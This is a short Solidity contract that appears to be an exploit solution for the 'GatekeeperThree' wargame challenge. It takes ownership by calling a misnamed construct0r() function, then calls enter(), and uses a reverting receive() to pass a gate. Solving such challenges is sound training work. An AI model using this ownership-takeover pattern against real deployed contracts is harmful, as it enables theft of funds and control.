// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperThree} from "src/GatekeeperThree/GatekeeperThree.sol";
import {console} from "forge-std/Test.sol";

contract GateunlockerThree {
    function unlock(GatekeeperThree target) public {
        target.construct0r();
        target.enter();
    }

    // Gate 3
    receive() external payable {
        revert("i dont take handouts");
    }
}
